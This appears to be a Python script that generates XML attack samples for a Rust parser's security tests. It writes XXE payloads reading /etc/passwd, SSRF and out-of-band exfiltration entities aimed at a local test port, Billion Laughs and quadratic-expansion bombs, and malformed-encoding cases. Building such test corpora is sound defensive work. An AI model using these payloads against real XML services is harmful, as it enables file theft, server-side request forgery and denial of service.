#!/usr/bin/env python3
"""生成 pure-xml-rs 攻击样本。

用法：
  python3 make_samples.py            # 生成入库的小样本（<100KB）到当前目录
  python3 make_samples.py --large    # 额外生成大样本到 generated/（已 .gitignore，不入库）

说明：cargo 测试不依赖本脚本——tests/security_tests.rs 会在内存中生成同样的大样本。
本脚本用于：重建样本、给 fuzz 语料、手工复现。
端口约定：所有 http:// 样本指向 127.0.0.1:18080，测试时会被替换为随机监听端口。
"""
import os, sys

HERE = os.path.dirname(os.path.abspath(__file__))
KIB = 1024
MIB = 1024 * 1024

def w(name, data, base=HERE):
    if isinstance(data, str):
        data = data.encode("utf-8")
    with open(os.path.join(base, name), "wb") as f:
        f.write(data)

def doc(subset, body="<r/>", root="r"):
    return f'<?xml version="1.0"?>\n<!DOCTYPE {root} [\n{subset}\n]>\n{body}\n'

def nest(depth):
    return "<a>" * depth + "</a>" * depth

def flat_refs(n, val="x"):
    return doc(f'<!ENTITY e "{val}">', "<r>" + "&e;" * n + "</r>")

def chain(depth):
    """depth 层嵌套：e1 -> e2 -> ... -> eN（eN 为纯文本），正文引用 &e1;。"""
    decls = [f'<!ENTITY e{i} "&e{i+1};">' for i in range(1, depth)]
    decls.append(f'<!ENTITY e{depth} "leaf">')
    return doc("\n".join(decls), "<r>&e1;</r>")

def blowup(entity_bytes, refs):
    return doc(f'<!ENTITY a "{"A" * entity_bytes}">', "<r>" + "&a;" * refs + "</r>")

def sized(subset, body_after_pad, target_len):
    """生成总长度恰好为 target_len 字节的文档：在 DOCTYPE 之后、根元素之前插入注释填充。"""
    base = doc(subset, "<!---->" + body_after_pad).encode()
    k = target_len - len(base)
    assert k >= 0, (target_len, len(base))
    out = doc(subset, "<!--" + "p" * k + "-->" + body_after_pad).encode()
    assert len(out) == target_len
    return out

def ratio_doc(ent_len, refs, extra_x, total_len=None):
    """实体 a（ent_len 字节）引用 refs 次，另加实体 b（"x"，1 字节）引用 extra_x 次。
    展开总量 = ent_len*refs + extra_x。total_len 给定时把整个输入调到恰好这么长。"""
    subset = f'<!ENTITY a "{"A" * ent_len}">\n<!ENTITY b "x">'
    body = "<r>" + "&a;" * refs + "&b;" * extra_x + "</r>"
    if total_len is None:
        return doc(subset, body)
    return sized(subset, body, total_len)

def names(n):
    return [f"a{i:05d}" for i in range(n)]

def small():
    # ---- S1 XXE file:// ----
    w("S1a-xxe-file.xml", doc('<!ENTITY x SYSTEM "file:///etc/passwd">', "<r>&x;</r>"))
    w("S1b-xxe-file-relative.xml", doc('<!ENTITY x SYSTEM "secret.txt">', "<r>&x;</r>"))
    w("S1c-xxe-public.xml", doc('<!ENTITY x PUBLIC "-//EVIL//X" "file:///etc/hostname">', "<r>&x;</r>"))
    w("S1d-xxe-declared-unused.xml", doc('<!ENTITY x SYSTEM "file:///etc/passwd">', "<r>safe</r>"))
    w("S1e-xxe-in-attribute.xml", doc('<!ENTITY x SYSTEM "file:///etc/passwd">', '<r a="&x;"/>'))
    w("S1f-xxe-unparsed-ndata.xml", doc('<!NOTATION n SYSTEM "x">\n<!ENTITY x SYSTEM "file:///etc/passwd" NDATA n>', "<r/>"))
    # ---- S2 XXE http://（SSRF）----
    w("S2a-xxe-http.xml", doc('<!ENTITY x SYSTEM "http://127.0.0.1:18080/xxe">', "<r>&x;</r>"))
    w("S2b-xxe-https.xml", doc('<!ENTITY x SYSTEM "https://127.0.0.1:18080/xxe">', "<r>&x;</r>"))
    # ---- S3 外部参数实体 / 外部 DTD ----
    w("S3a-external-pe.xml", doc('<!ENTITY % ext SYSTEM "http://127.0.0.1:18080/evil.dtd">\n%ext;'))
    # 外部 DTD（DOCTYPE 上的 SYSTEM/PUBLIC）：不加载、不报错、继续解析 → Ok + 零 IO
    w("S3b-external-dtd-http.xml", '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://127.0.0.1:18080/ext.dtd">\n<r/>\n')
    w("S3c-external-dtd-file.xml", '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "file:///etc/passwd">\n<r/>\n')
    w("S3d-external-dtd-public.xml", '<?xml version="1.0"?>\n<!DOCTYPE r PUBLIC "-//EVIL//DTD" "http://127.0.0.1:18080/p.dtd">\n<r/>\n')
    w("S3e-external-dtd-plus-subset.xml", '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://127.0.0.1:18080/ext.dtd" [\n<!ENTITY ok "fine">\n]>\n<r>&ok;</r>\n')
    w("S3g-entity-only-in-external-dtd.xml", '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://127.0.0.1:18080/ext.dtd">\n<r>&fromext;</r>\n')
    w("S3h-external-pe-declared-unused.xml", doc('<!ENTITY % ext SYSTEM "http://127.0.0.1:18080/evil.dtd">'))
    w("S3f-oob-exfil.xml", doc(
        '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://127.0.0.1:18080/?x=%file;\'>">\n'
        '%eval;\n%exfil;'))
    # ---- S4 Billion Laughs ----
    lol = ['<!ENTITY lol "lol">'] + [
        f'<!ENTITY lol{i} "' + f"&lol{'' if i == 1 else i-1};" * 10 + '">' for i in range(1, 10)]
    w("S4a-billion-laughs.xml", doc("\n".join(lol), "<r>&lol9;</r>"))
    # 浅层版：只 4 层（不触发深度 8），靠展开量/比例触发
    lol4 = ['<!ENTITY a0 "' + "lol" * 10 + '">'] + [
        f'<!ENTITY a{i} "' + f"&a{i-1};" * 20 + '">' for i in range(1, 5)]
    w("S4b-laughs-shallow-wide.xml", doc("\n".join(lol4), "<r>&a4;</r>"))
    w("S4c-laughs-in-attribute.xml", doc("\n".join(lol), '<r a="&lol9;"/>'))
    # ---- S5 二次膨胀（小版本入库，大版本见 --large）----
    # 10 KiB 实体 × 2000 次 ≈ 20 MB > 1 MiB
    w("S5a-quadratic-small.xml", blowup(10 * KIB, 2000))
    # ---- S6 递归 / 自引用 / 嵌套深度边界 / 展开次数边界 ----
    w("S6a-recursive-ab.xml", doc('<!ENTITY a "&b;">\n<!ENTITY b "&a;">', "<r>&a;</r>"))
    w("S6b-self-ref.xml", doc('<!ENTITY a "x&a;x">', "<r>&a;</r>"))
    w("S6c-recursive-in-attr.xml", doc('<!ENTITY a "&b;">\n<!ENTITY b "&a;">', '<r x="&a;"/>'))
    w("S6d-entity-depth-8-ok.xml", chain(8))
    w("S6e-entity-depth-9.xml", chain(9))
    w("S6f-expansions-10000-ok.xml", flat_refs(10_000))
    w("S6g-expansions-10001.xml", flat_refs(10_001))
    w("S6h-unbalanced-markup-in-entity.xml", doc('<!ENTITY e "<a>">', "<r>&e;</a></r>"))
    w("S6i-undeclared-entity.xml", "<r>&nope;</r>\n")
    # ---- 展开总量 / 比例边界（压线）----
    # 口径：展开总量 = 每次展开的替换文本字节累加；输入 = 整个文档字节数
    # 展开总量恰好 64 KiB（65536），比例约 50 倍 → 通过（≤64 KiB 不查比例）
    w("S6j-ratio-exact-64k-ok.xml", ratio_doc(1 * KIB, 64, 0))
    # 展开总量 65537（64 KiB + 1），比例约 50 倍 → SecurityLimit(ExpansionRatio)
    w("S6k-ratio-64k-plus1.xml", ratio_doc(1 * KIB, 64, 1))
    # 比例为流式检查：累加超过 64 KiB 后每次展开都检查 展开总量 ≤ 已读输入字节 × 10。
    # “已读输入” = 最后一个引用的 ';' 之后的偏移 = 文档总长 - len("</r>\n") = 总长 - 5。
    # 展开总量 204800（2 KiB × 100），最后一次展开时已读恰好 20480 字节 → 恰好 10 倍 → 通过
    # （比例随每次引用单调上升，最后一次展开最紧）
    w("S6l-ratio-exact-10x-ok.xml", ratio_doc(2 * KIB, 100, 0, total_len=20480 + 5))
    # 同样的展开量，最后一次展开时已读 20479 字节 → 略超 10 倍 → SecurityLimit(ExpansionRatio)
    w("S6m-ratio-10x-plus.xml", ratio_doc(2 * KIB, 100, 0, total_len=20479 + 5))
    # 只有流式口径才拦得住：前部 4 KiB × 100 次密集展开（409600 字节，此时已读约 4.5 KB，≈90 倍），
    # 后部 60000 字节普通文本，整篇约 65 KB → 全文比例约 6.3 倍（<10）。
    # 余量：即使“已读”多算 36 KB 的预读，前部仍 >10 倍；不触发 1 MiB（409600）或 1 万次（100）。
    # 预定义实体与字符引用不计入展开次数（Implementer 口径）：各 10_001 次 → 通过
    w("S6o-predefined-charrefs-not-counted-ok.xml", "<r>" + "&lt;" * 10_001 + "&#60;" * 10_001 + "</r>\n")
    w("S6n-ratio-streaming-only.xml", doc(f'<!ENTITY a "{"A" * (4 * KIB)}">',
      "<r>" + "&a;" * 100 + "t" * 60000 + "</r>"))
    # ---- S7 元素深度边界 ----
    w("S7a-depth-256-ok.xml", nest(256))
    w("S7b-depth-257.xml", nest(257))
    # ---- S8 名称 / 属性 ----
    w("S8a-duplicate-attr.xml", '<r a="1" a="2"/>\n')
    w("S8b-duplicate-attr-ns.xml",
      '<r xmlns:p="urn:x" xmlns:q="urn:x"><e p:a="1" q:a="2"/></r>\n')
    w("S8c-unbound-prefix.xml", '<p:r/>\n')
    w("S8d-xmlns-rebind.xml", '<r xmlns:xmlns="urn:x"/>\n')
    w("S8e-lt-in-attr.xml", '<r a="<"/>\n')
    # 属性数边界：每个元素最多 1024 个
    w("S8k-attrs-1024-ok.xml", "<r " + " ".join(f'{n}="1"' for n in names(1024)) + "/>\n")
    w("S8l-attrs-1025.xml", "<r " + " ".join(f'{n}="1"' for n in names(1025)) + "/>\n")
    # 名称长度边界：最长 1024 字节（按字节计，不含前缀情况）
    w("S8m-elem-name-1024-ok.xml", "<" + "n" * 1024 + "/>\n")
    w("S8n-elem-name-1025.xml", "<" + "n" * 1025 + "/>\n")
    w("S8o-attr-name-1024-ok.xml", "<r " + "a" * 1024 + '="1"/>\n')
    w("S8p-attr-name-1025.xml", "<r " + "a" * 1025 + '="1"/>\n')
    # 多字节：512 个 é = 1024 字节（512 字符）通过；再加 1 个 ASCII = 1025 字节报错（验证按字节计）
    w("S8q-name-1024-bytes-multibyte-ok.xml", "<" + "é" * 512 + "/>\n")
    w("S8r-name-1025-bytes-multibyte.xml", "<" + "é" * 512 + "a/>\n")
    # 结束标签名也要受限（开始标签 1025 已报错，此处验证 End 路径不绕过）
    w("S8s-end-name-1025.xml", "<r></" + "n" * 1025 + ">\n")
    # ---- S9 参数实体注入（M1：任何 PE 引用 → ExternalEntityForbidden）----
    w("S9a-pe-builds-external.xml", doc(
        '<!ENTITY % p "<!ENTITY x SYSTEM \'file:///etc/passwd\'>">\n%p;', "<r>&x;</r>"))
    w("S9b-pe-in-markup-decl.xml", doc('<!ENTITY % q "\'pwn\'">\n<!ENTITY e %q;>', "<r>&e;</r>"))
    w("S9c-pe-internal-simple.xml", doc('<!ENTITY % p "<!ENTITY x \'hi\'>">\n%p;', "<r>&x;</r>"))
    w("S9e-pe-declared-unused-ok.xml", doc('<!ENTITY % p "<!ENTITY x \'hi\'>">', "<r/>"))
    w("S9d-pe-laughs.xml", doc(
        '<!ENTITY % a "<!ENTITY b \'bbbbbbbbbb\'>">\n' + "%a;\n" * 2000))
    # ---- S10 编码 ----
    def body(bad):
        return b'<?xml version="1.0" encoding="UTF-8"?>\n<r>' + bad + b"</r>\n"
    w("S10a-utf8-bad-continuation.xml", body(b"\xc3\x28"))
    w("S10b-utf8-lone-continuation.xml", body(b"\x80"))
    w("S10c-utf8-overlong-2byte.xml", body(b"\xc0\xaf"))
    w("S10d-utf8-overlong-3byte.xml", body(b"\xe0\x80\xaf"))
    w("S10e-utf8-overlong-4byte.xml", body(b"\xf0\x80\x80\xaf"))
    w("S10f-utf8-surrogate-high.xml", body(b"\xed\xa0\x80"))
    w("S10g-utf8-surrogate-low.xml", body(b"\xed\xbf\xbf"))
    w("S10h-utf8-above-10ffff.xml", body(b"\xf4\x90\x80\x80"))
    w("S10i-utf8-invalid-ff-fe.xml", body(b"\xff\xfe"))
    w("S10j-utf8-truncated-eof.xml", b'<?xml version="1.0"?>\n<r>\xe4\xb8')
    w("S10k-utf8-bad-in-name.xml", b"<r\xc3\x28/>\n")
    w("S10l-utf8-bad-in-attr.xml", b'<r a="\xed\xa0\x80"/>\n')
    w("S10m-utf8-bad-in-comment.xml", b"<r><!-- \xc0\x80 --></r>\n")
    w("S10n-utf8-bad-in-cdata.xml", b"<r><![CDATA[\xf8\x88\x80\x80\x80]]></r>\n")
    w("S10o-utf8-5byte-seq.xml", body(b"\xf8\x88\x80\x80\x80"))
    w("S10p-utf16le-bom.xml", "\ufeff<r/>\n".encode("utf-16-le"))
    w("S10q-utf16be-bom.xml", "\ufeff<r/>\n".encode("utf-16-be"))
    w("S10r-utf16-truncated.xml", "\ufeff<r/>".encode("utf-16-le") + b"<")
    w("S10s-utf16-declared-no-bom.xml", b'<?xml version="1.0" encoding="UTF-16"?>\n<r/>\n')
    w("S10t-utf8-bom-declares-utf16.xml", b'\xef\xbb\xbf<?xml version="1.0" encoding="UTF-16"?>\n<r/>\n')
    w("S10u-utf16le-bom-declares-utf8.xml",
      '\ufeff<?xml version="1.0" encoding="UTF-8"?>\n<r/>\n'.encode("utf-16-le"))
    w("S10v-utf32le-bom.xml", "\ufeff<r/>\n".encode("utf-32-le"))
    w("S10w-unsupported-encoding.xml", b'<?xml version="1.0" encoding="EBCDIC-XYZ"?>\n<r/>\n')
    # 合法 UTF-8 但 XML 非法字符 → Syntax
    w("S10x-xml-illegal-char-ctrl.xml", body(b"\x01"))
    w("S10y-xml-illegal-nul.xml", body(b"\x00"))
    w("S10z-xml-illegal-fffe.xml", body("\ufffe".encode("utf-8")))
    w("S10za-charref-surrogate.xml", body(b"&#xD800;"))
    w("S10zb-charref-zero.xml", body(b"&#0;"))
    w("S10zc-charref-too-big.xml", body(b"&#x110000;"))

def large():
    out = os.path.join(HERE, "generated")
    os.makedirs(out, exist_ok=True)
    w("S5b-quadratic-50k-x-50k.xml", blowup(50 * KIB, 50_000), out)   # ~200 KB 输入，展开 ~2.4 GB
    # 绝对上限 1 MiB 压线：输入 110000 字节（10 倍 = 1.1 MB > 1 MiB，不触发比例）
    w("S5c-abs-1mib-exact-ok.xml", ratio_doc(64 * KIB, 16, 0, total_len=110_000), out)
    w("S5d-abs-1mib-plus1.xml", ratio_doc(64 * KIB, 16, 1, total_len=110_000), out)
    w("S7c-depth-100000.xml", nest(100_000), out)
    w("S7d-depth-100000-unclosed.xml", "<a>" * 100_000, out)
    w("S8f-long-element-name-1mib.xml", "<" + "n" * MIB + "/>", out)
    w("S8g-long-attr-name-1mib.xml", "<r " + "a" * MIB + '="1"/>', out)
    w("S8h-long-attr-value-16mib-plus1.xml", '<r a="' + "v" * (16 * MIB + 1) + '"/>', out)
    w("S8i-many-attrs-100k.xml", "<r " + " ".join(f'a{i}="1"' for i in range(100_000)) + "/>", out)
    w("S8j-long-text-64mib.xml", "<r>" + "t" * (64 * MIB) + "</r>", out)
    w("S8t-text-16mib-ok.xml", "<r>" + "t" * (16 * MIB) + "</r>", out)
    w("S8u-text-16mib-plus1.xml", "<r>" + "t" * (16 * MIB + 1) + "</r>", out)

if __name__ == "__main__":
    small()
    if "--large" in sys.argv:
        large()
    print("ok")
